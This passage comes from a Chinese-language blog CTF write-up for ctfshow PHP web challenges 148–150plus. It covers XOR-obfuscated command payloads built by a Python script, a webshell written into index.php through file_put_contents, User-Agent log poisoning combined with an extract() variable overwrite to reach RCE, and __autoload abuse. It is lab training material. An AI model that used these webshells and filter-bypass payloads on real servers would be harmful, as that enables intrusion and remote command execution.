class="hljs-literal">True</span>:<br>           t=f.readline()<br>           <span class="hljs-keyword">if</span> t==<span class="hljs-string">&quot;&quot;</span>:<br>               <span class="hljs-keyword">break</span><br>           <span class="hljs-keyword">if</span> t[<span class="hljs-number">0</span>]==i:<br>               <span class="hljs-comment">#print(i)</span><br>               s1+=t[<span class="hljs-number">2</span>:<span class="hljs-number">5</span>]<br>               s2+=t[<span class="hljs-number">6</span>:<span class="hljs-number">9</span>]<br>               <span class="hljs-keyword">break</span><br>       f.close()<br>   output=<span class="hljs-string">&quot;(\&quot;&quot;</span>+s1+<span class="hljs-string">&quot;\&quot;^\&quot;&quot;</span>+s2+<span class="hljs-string">&quot;\&quot;)&quot;</span><br>   <span class="hljs-keyword">return</span>(output)<br>   <br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>   param=action(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[+] your command：&quot;</span>))+<span class="hljs-string">&quot;;&quot;</span><br>   <span class="hljs-built_in">print</span>(param)<br><br></code></pre></td></tr></table></figure>

<p>例如：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl">[+] your function：<span class="hljs-keyword">system</span><br>[+] your command：ls<br>(<span class="hljs-string">&quot;<span class="hljs-variable">%0</span>8<span class="hljs-variable">%0</span>2<span class="hljs-variable">%0</span>8<span class="hljs-variable">%0</span>8<span class="hljs-variable">%0</span>5<span class="hljs-variable">%0d</span>&quot;</span>^<span class="hljs-string">&quot;%7b%7b%7b%7c<span class="hljs-variable">%6</span>0<span class="hljs-variable">%60</span>&quot;</span>)(<span class="hljs-string">&quot;%0c<span class="hljs-variable">%08</span>&quot;</span>^<span class="hljs-string">&quot;<span class="hljs-variable">%6</span>0<span class="hljs-variable">%7b</span>&quot;</span>);<br></code></pre></td></tr></table></figure>

<p><strong>payload：</strong></p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">?code=(<span class="hljs-string">&quot;<span class="hljs-variable">%0</span>8<span class="hljs-variable">%0</span>2<span class="hljs-variable">%0</span>8<span class="hljs-variable">%0</span>9<span class="hljs-variable">%0</span>5<span class="hljs-variable">%0d</span>&quot;</span>^<span class="hljs-string">&quot;%7b%7b%7b%7d<span class="hljs-variable">%6</span>0<span class="hljs-variable">%60</span>&quot;</span>)(<span class="hljs-string">&quot;<span class="hljs-variable">%0</span>9<span class="hljs-variable">%0</span>1<span class="hljs-variable">%0</span>3<span class="hljs-variable">%0</span>1<span class="hljs-variable">%0</span>6<span class="hljs-variable">%02</span>&quot;</span>^<span class="hljs-string">&quot;%7d<span class="hljs-variable">%6</span>0<span class="hljs-variable">%6</span>0<span class="hljs-variable">%2</span>1<span class="hljs-variable">%6</span>0<span class="hljs-variable">%28</span>&quot;</span>);<br></code></pre></td></tr></table></figure>

<p><strong>法二：中文变量</strong></p>
<p>payload：</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>ode=<span class="hljs-variable">$哈</span>=<span class="hljs-string">&quot;`&#123;&#123;&#123;&quot;</span>^<span class="hljs-string">&quot;?&lt;&gt;/&quot;</span>;<span class="hljs-variable">$&#123;</span><span class="hljs-variable">$哈</span>&#125;[哼](<span class="hljs-variable">$&#123;</span><span class="hljs-variable">$哈</span>&#125;[嗯]);&amp;哼=system&amp;嗯=tac f*<br>其中<span class="hljs-string">&quot;`&#123;&#123;&#123;&quot;</span> ^ <span class="hljs-string">&quot;?&lt;&gt;/&quot;</span>异或得到_GET<br><span class="hljs-variable">$哈</span>=_GET;<br><span class="hljs-variable">$_GET</span>[哼](<span class="hljs-variable">$_GET</span>[嗯]);<br><span class="hljs-string">?哼</span>=system&amp;嗯=tac f*<br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-149（file-put-contents）"><a href="#web-149（file-put-contents）" class="headerlink" title="web-149（file_put_contents）"></a>web-149（file_put_contents）</h2><p>源码：</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs gams">error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(__FILE__);<br><br><span class="hljs-meta"><span class="hljs-keyword">$files</span> = scandir(&#x27;./&#x27;); </span><br>foreach(<span class="hljs-symbol">$</span><span class="hljs-keyword">files</span> as <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>) &#123;<br>    <span class="hljs-keyword">if</span>(is_file(<span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>))&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-symbol">$</span><span class="hljs-keyword">file</span> !== <span class="hljs-string">&quot;index.php&quot;</span>) &#123;<br>            unlink(<span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br>file_put_contents(<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">&#x27;ctf&#x27;</span>], <span class="hljs-symbol">$</span>_POST[<span class="hljs-string">&#x27;show&#x27;</span>]);<br><br><span class="hljs-meta"><span class="hljs-keyword">$files</span> = scandir(&#x27;./&#x27;); </span><br>foreach(<span class="hljs-symbol">$</span><span class="hljs-keyword">files</span> as <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>) &#123;<br>    <span class="hljs-keyword">if</span>(is_file(<span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>))&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-symbol">$</span><span class="hljs-keyword">file</span> !== <span class="hljs-string">&quot;index.php&quot;</span>) &#123;<br>            unlink(<span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs smali">scandir(string $directory,<span class="hljs-built_in"> int </span>$sorting_order = ?, resource $context = ?):<span class="hljs-built_in"> array</span><br><span class="hljs-built_in"></span>返回一个 array，包含有 directory 中的文件和目录。 <br>directory<br>    要被浏览的目录<br>sorting_order<br>	默认的排序顺序是按字母升序排列。如果使用了可选参数 sorting_order（设为 1），则排序顺序是按字母降序排列。<br>返回值<br>	成功则返回包含有文件名的 array，如果失败则返回 false<br><br></code></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-keyword">foreach</span> 语法结构提供了遍历数组的简单方式。<span class="hljs-keyword">foreach</span> 仅能够应用于数组和对象，如果尝试应用于其他数据类型的变量，或者未初始化的变量将发出错误信息。有两种语法：<br><span class="hljs-keyword">foreach</span> (iterable_expression <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>)<br>    statement<br><span class="hljs-keyword">foreach</span> (iterable_expression <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>)<br>    statement<br>第一种格式遍历给定的 iterable_expression 迭代器。每次循环中，当前单元的值被赋给 <span class="hljs-variable">$value</span>。<br>第二种格式做同样的事，只除了当前单元的键名也会在每次循环中被赋给变量 <span class="hljs-variable">$key</span>。 <br>例：<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>);<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$arr</span> <span class="hljs-keyword">as</span> &amp;<span class="hljs-variable">$value</span>) &#123;<br>    <span class="hljs-variable">$value</span> = <span class="hljs-variable">$value</span> * <span class="hljs-number">2</span>;<br>&#125;<br><span class="hljs-comment">// 现在 $arr 是 array(2, 4, 6, 8)</span><br><br></code></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-keyword">string</span> <span class="hljs-variable">$filename</span>, resource <span class="hljs-variable">$context</span> = ?): <span class="hljs-keyword">bool</span><br>删除 filename。<br>filename<br>    文件的路径。<br>返回值<br>	成功时返回 <span class="hljs-literal">true</span>， 或者在失败时返回 <span class="hljs-literal">false</span>。<br></code></pre></td></tr></table></figure>

<p>解题思路：</p>
<p>这题就是利用file_put_content函数写入文件然后执行命令</p>
<p>payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">重写index，写个马进去 然后访问index POST:cmd=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat /ctfshow_fl0g_here.txt&#x27;</span>);<br>ctf=index.php<br>show=<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;tac /c*&#x27;</span>;)<span class="hljs-meta">?&gt;</span><br><br><br><span class="hljs-number">1</span>=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;ls /&quot;</span>);	<span class="hljs-comment">//查看目录</span><br><span class="hljs-number">1</span>=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;tac /ctfshow_fl0g_here.txt&quot;</span>);	<span class="hljs-comment">//查看flag</span><br></code></pre></td></tr></table></figure>

<p><strong>非预期</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">ctf=index.php<br>POST：show=<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-150（日志包含rce）"><a href="#web-150（日志包含rce）" class="headerlink" title="web-150（日志包含rce）"></a>web-150（日志包含rce）</h2><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CTFSHOW</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$vip</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$secret</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;vip = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;secret = <span class="hljs-variable">$flag</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;secret;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isVIP</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;vip?<span class="hljs-literal">TRUE</span>:<span class="hljs-literal">FALSE</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__autoload</span>(<span class="hljs-params"><span class="hljs-variable">$class</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$class</span>))&#123;<br>            <span class="hljs-variable">$class</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">#过滤字符</span><br><span class="hljs-variable">$key</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\_| |\[|\]|\?/&#x27;</span>, <span class="hljs-variable">$key</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error&quot;</span>);<br>&#125;<br><span class="hljs-variable">$ctf</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>];<br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_GET</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">class_exists</span>(<span class="hljs-variable">$__CTFSHOW__</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;class is exists!&quot;</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$isVIP</span> &amp;&amp; <span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$ctf</span>, <span class="hljs-string">&quot;:&quot;</span>)===<span class="hljs-literal">FALSE</span>)&#123;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$ctf</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>解题思路：</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">extract </span>— 从数组中将变量导入到当前的符号表<br><br>class_exists — 检查类是否已定义<br></code></pre></td></tr></table></figure>

<p>所以我们可以传入isVIP&#x3D;1，通过<code>extract()</code>将原来的值覆盖掉</p>
<p>然后利用日志文件包含来rce</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua">日志路径是/var/<span class="hljs-built_in">log</span>/nginx/access.<span class="hljs-built_in">log</span><br></code></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">User-Agent:<span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[a]);<span class="hljs-meta">?&gt;</span><br>GET:?isVIP=<span class="hljs-number">1</span><br>POST:ctf=/<span class="hljs-keyword">var</span>/log/nginx/access.log&amp;a=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;tac fl*&quot;</span>);<br></code></pre></td></tr></table></figure>

<p>现在UA头里写入一句话，EXECUTE</p>
<p>然后进行日志包含：POST</p>
<p>让$isVIP等于1：GET        EXECUTE</p>
<p>&#x2F;&#x2F;如果出不来，就换一个浏览器</p>
<hr>
<h2 id="web-150plus（-autoload-）"><a href="#web-150plus（-autoload-）" class="headerlink" title="web-150plus（__autoload()）"></a>web-150plus（__autoload()）</h2><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CTFSHOW</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$vip</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$secret</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;vip = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;secret = <span class="hljs-variable">$flag</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;secret;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isVIP</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;vip?<span class="hljs-literal">TRUE</span>:<span class="hljs-literal">FALSE</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//注意从这里class已经结束了，下面是一个专门的方法</span><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__autoload</span>(<span class="hljs-params"><span class="hljs-variable">$class</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$class</span>))&#123;<br>            <span class="hljs-variable">$class</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">#过滤字符</span><br><span class="hljs-variable">$key</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\_| |\[|\]|\?/&#x27;</span>, <span class="hljs-variable">$key</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error&quot;</span>);<br>&#125;<br><span class="hljs-variable">$ctf</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>];<br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_GET</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">class_exists</span>(<span class="hljs-variable">$__CTFSHOW__</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;class is exists!&quot;</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$isVIP</span> &amp;&amp; <span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$ctf</span>, <span class="hljs-string">&quot;:&quot;</span>)===<span class="hljs-literal">FALSE</span> &amp;&amp; <span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$ctf</span>,<span class="hljs-string">&quot;log&quot;</span>)===<span class="hljs-literal">FALSE</span>)&#123;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$ctf</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>解题思路：</p>
<p>不能有：，也不能有log了</p>
<p><strong>function autoload是当进行类判断的时候(if(class_exists)，会自动调用function autoload</strong></p>
<p><strong>所以要尝试控制</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$_CTFSHOW_</span><br></code></pre></td></tr></table></figure>

<p><strong>因为_被ban</strong></p>
<p><strong>可以用..来绕过</strong></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?.</span>.<span class="hljs-variable constant_">CTFSHOW</span>..=phpinfo<br></code></pre></td></tr></table></figure>

<p><strong>原本要在进行文件包含，但是服务器负载较大，所以这个phpinfo里面就有flag</strong></p>
<p><strong>直接CTRL+F，查找flag就行了</strong></p>

      
       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
    </div>
</article>





    <div id="comments">
    <script>
        {
            const comments = document.getElementById("comments");
            const script = document.createElement("script");
            script.src = "https://giscus.app/client.js";
            script.setAttribute('data-repo', "MIXBP/MIXBP.github.io");
            script.setAttribute('data-repo-id', "R_kgDONYaZsg");
            script.setAttribute('data-category', "Announcements");
            script.setAttribute('data-category-id', "DIC_kwDONYaZss4ClAnT");
            script.setAttribute('data-mapping', "pathname");
            script.setAttribute('data-strict', "0");
            script.setAttribute('data-reactions-enabled', "1");
            script.setAttribute('data-emit-metadata', "0");
            script.setAttribute('data-input-position', "top");
            script.setAttribute('data-theme', "noborder_dark");
            script.setAttribute('data-lang', "zh-CN");
            script.setAttribute('data-loading', "lazy");
            script.setAttribute('crossorigin', "anonymous");
            script.setAttribute('async', "");
            comments.appendChild(script);
        }
    </script>
</div>



    




    </div>
    <div class="copyright">
        <p class="footer-entry">
    ©MIXBP 2024
</p>
<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>

    </div>
    <div class="full-toc">
        <button class="full" data-title="Toggle full screen shortcut key s"><span class="min "></span></button>
<a class="" id="rocket" ></a>

    </div>
</div>

</body>
<script src="/js/jquery.pjax.js?v=1.1.0" ></script>

<script src="/js/script.js?v=1.1.0" ></script>
<script>
    var img_resize = 'default';
    function initArticle() {
        /*渲染对应的表格样式*/
        
            $("#post .pjax table").addClass("green_title");
        

        /*渲染打赏样式*/
        

        /*高亮代码块行号*/
        

        /*访问数量*/
        
        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
        

        /*代码高亮，行号对齐*/
        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));

        
        
    }

    /*打赏页面隐藏与展示*/
    

</script>

<!--加入行号的高亮代码块样式-->

<!--自定义样式设置-->
<style>
    
    
    .nav {
        width: 542px;
    }
    .nav.fullscreen {
        margin-left: -542px;
    }
    .nav-left {
        width: 120px;
    }
    
    
    @media screen and (max-width: 1468px) {
        .nav {
            width: 492px;
        }
        .nav.fullscreen {
            margin-left: -492px;
        }
        .nav-left {
            width: 100px;
        }
    }
    
    
    @media screen and (max-width: 1024px) {
        .nav {
            width: 492px;
            margin-left: -492px
        }
        .nav.fullscreen {
            margin-left: 0;
        }
    }
    
    @media screen and (max-width: 426px) {
        .nav {
            width: 100%;
        }
        .nav-left {
            width: 100%;
        }
    }
    
    
    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
        color: #383636;
    }
    
    
    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
        color: #5e5e5f;
    }
    
    
    .nav-right nav a.hover, #local-search-result a.hover{
        background-color: #e2e0e0;
    }
    
    

    /*列表样式*/
    

    /* 背景图样式 */
    
    #post {
        background: url(/img/background.jpg);
    }
    
    
    #post .index {
        background: url(/img/background2.jpg);
    }
    


    /*引用块样式*/
    

    /*文章列表背景图*/
    
    .nav-right:before {
        content: ' ';
        display: block;
        position: absolute;
        left: 0;
        top: 0;
        width: 100%;
        height: 100%;
        opacity: 0.5;
        background: url("/img/bjtp.jpg");
        background-repeat: no-repeat;
        background-position: 50% 0;
        -ms-background-size: cover;
        -o-background-size: cover;
        -moz-background-size: cover;
        -webkit-background-size: cover;
        background-size: cover;
    }
    

    
</style>






<div class="mobile-menus-out" >

</div>
<div class="mobile-menus">
    
    
    
    <a class="dynamic-menu " target="_self"   href="https://mixbp.github.io/">MIXBP</a>
    
    
    <a class="dynamic-menu " target="_blank"  href="https://mixbp.github.io/">github</a>
    
</div>


</html>
